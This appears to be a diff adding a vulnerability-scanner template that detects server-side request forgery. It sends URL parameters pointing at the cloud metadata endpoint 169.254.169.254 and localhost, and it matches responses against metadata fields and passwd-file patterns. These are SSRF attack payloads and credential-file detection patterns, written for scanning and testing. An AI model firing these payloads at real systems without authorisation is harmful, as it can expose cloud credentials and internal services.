@@ -1,0 +1,40 @@
+id: hunt3r-ssrf-detection
+
+info:
+  name: SSRF - Server-Side Request Forgery
+  author: hunt3r
+  severity: high
+  description: Detects SSRF via URL parameters that may cause server-side requests to internal resources.
+  tags: ssrf,hunt3r
+  reference:
+    - https://portswigger.net/web-security/ssrf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://127.0.0.1/"
+      - "{{BaseURL}}/?target=http://169.254.169.254/"
+      - "{{BaseURL}}/?path=http://127.0.0.1/"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/fetch?url=http://127.0.0.1/"
+      - "{{BaseURL}}/redirect?url=http://127.0.0.1/"
+      - "{{BaseURL}}/api/fetch?url=http://127.0.0.1:8080/"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "ami-id"
+          - "instance-id"
+          - "169.254.169.254"
+          - "local-hostname"
+          - "root:([x*]|[a-zA-Z0-9!$#%_@&\\.\\-]+):0:0:"
+
+      - type: word
+        part: body
+        words:
+          - "ami-"
+          - "ec2metadata"
+          - "instance-type"
